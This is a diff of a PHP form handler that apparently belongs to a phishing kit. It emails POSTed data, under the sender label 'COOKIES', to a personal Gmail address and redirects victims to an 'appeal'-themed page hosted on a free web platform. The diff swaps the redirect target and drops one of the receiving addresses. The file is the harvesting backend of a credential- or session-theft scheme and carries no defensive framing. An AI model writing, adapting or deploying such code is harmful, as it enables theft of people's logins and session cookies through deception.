@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://candid-belekoy-64bfd5.netlify.app/");
+header("Location: https://re-appeal-here-again.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -36,7 +36,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // Email properties
         $mail->setFrom('rutherfordhenress@gmail.com', 'COOKIES');
         $mail->addAddress('rutherfordhenress@gmail.com');
-        $mail->addAddress('shohiebnizamani@gmail.com');
+        
 
 
       // Email recipient's address
